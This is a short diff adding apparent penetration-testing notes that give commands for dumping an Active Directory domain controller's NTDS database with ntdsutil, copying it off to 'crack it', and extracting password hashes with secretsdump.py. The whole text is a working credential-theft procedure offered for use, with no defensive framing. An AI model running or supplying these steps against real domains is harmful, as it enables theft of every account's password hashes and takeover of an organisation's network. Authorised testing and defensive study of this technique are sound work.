@@ -1,0 +1,12 @@
+Run the following on the DC:
+
+ntdsutil
+activate instance ntds
+ifm
+create full C:\temp\ntdsutil
+quit
+quit
+
+Then copy the folder to your machine to crack it
+
+python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
